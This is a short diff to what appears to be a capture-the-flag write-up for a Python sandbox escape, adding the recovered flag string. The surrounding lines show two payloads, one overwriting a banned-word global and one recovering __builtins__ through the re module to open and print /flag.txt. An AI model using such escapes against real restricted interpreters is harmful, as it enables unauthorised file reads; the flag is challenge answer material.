@@ -78,6 +78,4 @@ payload 1: `globals['banned'] = 'string_we_are_never_going_to_use'`
 payload 2: `__builtins__ = globals['re'].__builtins__; print(__builtins__['open']('/flag.txt', 'rb').read());`
 
 ### Flag:
-`flag{}`
-
-(The server shut down after the event so I do not remember the flag, believe me it works lol)
+`flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}`
